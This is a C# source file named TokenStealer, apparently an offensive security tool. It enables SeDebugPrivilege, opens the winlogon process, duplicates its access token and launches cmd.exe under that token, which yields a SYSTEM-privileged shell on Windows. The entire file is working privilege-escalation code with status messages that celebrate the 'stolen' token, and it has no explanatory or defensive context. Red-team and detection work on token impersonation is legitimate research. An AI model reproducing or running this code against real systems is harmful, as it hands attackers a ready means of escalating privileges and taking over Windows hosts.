using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TokenStealer
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        // Use this signature if you do not want the previous state
        [DllImport("advapi32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 Zero, IntPtr Null1, IntPtr Null2);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        static readonly uint PROCESS_ACCESS_FLAG = 0x001F0FFF;
        
        static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        static readonly uint CreateWithConsole = 0x00000010;

        [Flags()]
        enum  TAF : int
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID),
            TOKEN_NEEDED = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TOKEN_PRIVILEGES
        {
            public int Count;
            public long Luid;
            public int Attributes;
        }

        static void Main(string[] args)
        {
       
            string execute = "cmd.exe";
            SetPriv();
            // open process 
            int pid = Process.GetProcessesByName("winlogon")[0].Id;
            IntPtr hProc = OpenProcess(PROCESS_ACCESS_FLAG, false, pid);
            Console.WriteLine("[+] Accessing winlogon...");

            // open process token
            IntPtr hToken = IntPtr.Zero;
            bool opToken = OpenProcessToken(hProc, (int)TAF.TOKEN_DUPLICATE, out hToken);               

            // duplicate token
            IntPtr newToken;
            bool dupToken = DuplicateTokenEx(hToken, (uint)TAF.TOKEN_NEEDED, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                TOKEN_TYPE.TokenPrimary, out newToken);
        
            Console.WriteLine("[+] Create process with winlogon\'s token...");

            // create process with token
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION procinfo = new PROCESS_INFORMATION();

            bool created = CreateProcessWithTokenW(newToken, LogonFlags.WithProfile, execute, null, CreateWithConsole, IntPtr.Zero, null, ref si, out procinfo);
            if (!created)
            {
                Console.WriteLine("[-] Process not spawned. Something went wrong.");
            }
            else {
                Console.WriteLine("[+] Process spawned with token that was stolen.");
            }

        }


        private static bool SetPriv()
        {
            try
            {
                bool retVal;
                TOKEN_PRIVILEGES tp;
                int epid = Process.GetCurrentProcess().Id;
                IntPtr hproc = OpenProcess(PROCESS_ACCESS_FLAG,false,epid);
                IntPtr htok = IntPtr.Zero;
                retVal = OpenProcessToken(hproc, (int)TAF.TOKEN_ADJUST_PRIVILEGES | (int)TAF.TOKEN_QUERY, out htok);
                tp.Count = 1;
                tp.Luid = 0;
                tp.Attributes = SE_PRIVILEGE_ENABLED;
                retVal = LookupPrivilegeValue(null, "SeDebugPrivilege", ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine("[*] surely not working.");
                return retVal;
            }
            catch (Exception ex)
            {
                throw;
            }

        }
    }
}
